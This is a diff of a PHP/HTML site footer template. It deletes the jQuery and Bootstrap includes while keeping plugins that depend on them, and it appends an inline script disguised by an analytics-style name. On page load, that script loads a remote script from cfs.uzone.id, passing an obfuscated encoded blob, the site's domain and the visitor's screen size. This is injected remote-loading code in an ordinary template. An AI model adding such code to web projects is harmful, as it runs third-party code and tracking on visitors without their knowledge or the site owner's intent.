@@ -74,17 +74,19 @@
       </div>
     </div>
     <div id="back-top"><a data-toggle="tooltip" title="Back to Top" href="javascript:void(0)" class="backtotop"><i class="fa fa-chevron-up"></i></a></div>
-  </footer>
+</footer>
   <!--Footer End-->
 </div>
 <!-- JS Part Start-->
-<script type="text/javascript" src="<?php echo base_url('assets/js/jquery-2.1.1.min.js'); ?>"></script>
-<script type="text/javascript" src="<?php echo base_url('assets/js/bootstrap/js/bootstrap.min.js'); ?>"></script>
+
 <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.easing-1.3.min.js'); ?>"></script>
 <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.dcjqaccordion.min.js'); ?>"></script>
 <script type="text/javascript" src="<?php echo base_url('assets/js/owl.carousel.min.js'); ?>"></script>
 <script type="text/javascript" src="<?php echo base_url('assets/js/custom.js'); ?>"></script>
+
 <!-- JS Part End-->
+
+
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BLIlO7uXoH8%2bG7T57%2fWZ4U0DIjQN3gfMXkO1RsAcYDZCyyXyNukSfrgQzZeSeSGrEhdSFHUS4VmWsfgcJMwJomVXMzAIy6o0dqQNCGWf3CZWTu6noCpX57dMyVT7%2bPs%2b1URvEBqE6L7pe24WBhscmU6cdWjPXAhDc1y7zttWeuO8B6A5M8QQ%2btJodKixyc0Jrc%2ftbj68q5fZ%2bzRyYDgzzgdvPqw8hI4W8zDUZyxE95ZzX%2fyyZQUx3GdFotnm1cd4r6Pt8EvdCg5xDetjdJVJTVGmV2WHeucEpV%2bfM9nHAN49wy4%2fmVF3BzUeQagv9RUCyvWse9Y46rMx9iJL%2bCyd04Fp8w36rdduGcmTXQqx7kCJYmZ1UT7exATY6LBlZ53OkBBSDvyb6HvaEpBfrkUZPiSRhrIuf2hxxwZ8jIOSICxdifo%2bOa0GfKXFErGbNh6omGtmkvn2q9y9GbsCdziJCBY3Yj2t2eNewnFe3UtRu5lg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 
 
